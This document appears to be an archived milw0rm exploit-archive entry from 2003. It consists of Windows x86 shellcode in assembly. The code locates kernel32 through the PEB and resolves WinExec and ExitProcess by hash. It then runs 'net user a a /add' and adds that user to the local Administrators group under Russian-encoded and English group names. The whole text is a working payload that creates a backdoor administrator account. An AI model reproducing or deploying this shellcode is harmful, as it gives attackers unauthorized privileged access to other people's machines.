; Segment type:	Pure code
;seg000		segment	byte public 'CODE' use32
;		assume cs:seg000
;		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
.386
assume cs:seg000
var_29C		= byte ptr -29Ch
var_28C		= byte ptr -28Ch
var_25F		= byte ptr -25Fh
var_254		= dword	ptr -254h
var_250		= dword	ptr -250h
var_24C		= dword	ptr -24Ch

seg000		segment	byte public 'CODE' use32

beginofpackeddata:			; CODE XREF: UnXORFunc+17j
		push	ebp
		mov	ebp, esp
		sub	esp, 80h
		mov	esi, esp
		call	sub_191
		push eax
		mov	eax, fs:18h
		mov	eax, [eax+30h]
		lea	eax, [eax+18h]
		mov	ebx, 190000h
		mov	[eax], ebx
		pop  eax
		mov	[esi], eax
		push	dword ptr [esi]
		push	0E8AFE98h
		call	GetFunctionBYName ;WinExec
		mov	[esi+0Ch], eax
		push	dword ptr [esi]
		push 	73e2d87eh
		call	GetFunctionBYName ;ExitProcess
		mov	[esi+10h], eax

		xor	eax, eax
		push	eax
		push	'd'
		push	'da/ '
		push	'a a '
		push	'resu'
		push	' ten'
		mov	ecx, esp
		push	eax
		push	ecx
		call	dword ptr [esi+0Ch]

		xor	eax, eax
		push	eax
		push	'd'
		push	'da/ '
		push	'a û'
		push	'ðîòà'
		push	'ðòñè'
		push	'íèìä'
		push	'À pu'
		push	'orgl'
		push	'acol'
		push	' ten'
		mov	ecx, esp
		push	eax
		push	ecx
		call	dword ptr [esi+0Ch]

		xor	eax, eax
		push	eax
		push	'd'
		push	'da/ '
		push	'a ë'
		push	'à®â '
		push	'àâá¨'
		push	'­¨¬¤'
		push	'€ pu'
		push	'orgl'
		push	'acol'
		push	' ten'
		mov	ecx, esp
		push	eax
		push	ecx
		call	dword ptr [esi+0Ch]

		xor	eax, eax
		push	eax
		push	'd'
		push	'da/ '
		push	'a s'
		push	'rota'
		push	'rtsi'
		push	'nimd'
		push	'A pu'
		push	'orgl'
		push	'acol'
		push	' ten'
		mov	ecx, esp
		push	eax
		push	ecx
		call	dword ptr [esi+0Ch]

		push	0h
		call	dword ptr [esi+10h] ;
;		end

; ››››››››››››››› S U B	R O U T	I N E ›››››››››››››››››››››››››››››››››››››››


GetFunctionBYName proc near		; CODE XREF: UnXORFunc+31p
					; UnXORFunc+40p ...

arg_0		= dword	ptr  14h
arg_4		= dword	ptr  18h

		push	ebx
		push	ebp
		push	esi
		push	edi
		mov	ebp, [esp+arg_4]
		mov	eax, [ebp+3Ch]
		mov	edx, [ebp+eax+78h]
		add	edx, ebp
		mov	ecx, [edx+18h]
		mov	ebx, [edx+20h]
		add	ebx, ebp

loc_1B2:				; CODE XREF: GetFunctionBYName+36j
		jecxz	short loc_1E6
		dec	ecx
		mov	esi, [ebx+ecx*4]
		add	esi, ebp
		xor	edi, edi
		cld

loc_1BD:				; CODE XREF: GetFunctionBYName+30j
		xor	eax, eax
		lodsb
		cmp	al, ah
		jz	short loc_1CB
		ror	edi, 0Dh
		add	edi, eax
		jmp	short loc_1BD
; „„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„

loc_1CB:				; CODE XREF: GetFunctionBYName+29j
		cmp	edi, [esp+arg_0]
		jnz	short loc_1B2
		mov	ebx, [edx+24h]
		add	ebx, ebp
		mov	cx, [ebx+ecx*2]
		mov	ebx, [edx+1Ch]
		add	ebx, ebp
		mov	eax, [ebx+ecx*4]
		add	eax, ebp
		jmp	short loc_1E8
; „„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„

loc_1E6:				; CODE XREF: GetFunctionBYName+19j
		xor	eax, eax

loc_1E8:				; CODE XREF: GetFunctionBYName+4Bj
		mov	edx, ebp
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn	4
GetFunctionBYName endp

sub_191		proc near		; CODE XREF: sub_76+Bp
		push	ebp
		push	esi
		mov	eax, fs:30h
		test	eax, eax
		js	short loc_1A9
		mov	eax, [eax+0Ch]
		mov	esi, [eax+1Ch]
		lodsd
		mov	ebp, [eax+8]
		jmp	short loc_1B2
; „„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„

loc_1A9:				; CODE XREF: sub_191+Aj
		mov	eax, [eax+34h]
		mov	ebp, [eax+0B8h]

loc_1B2:				; CODE XREF: sub_191+16j
		mov	eax, ebp
		pop	esi
		pop	ebp
		retn	4
sub_191 endp
; „„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„

seg000		ends

end

; milw0rm.com [2003-10-09]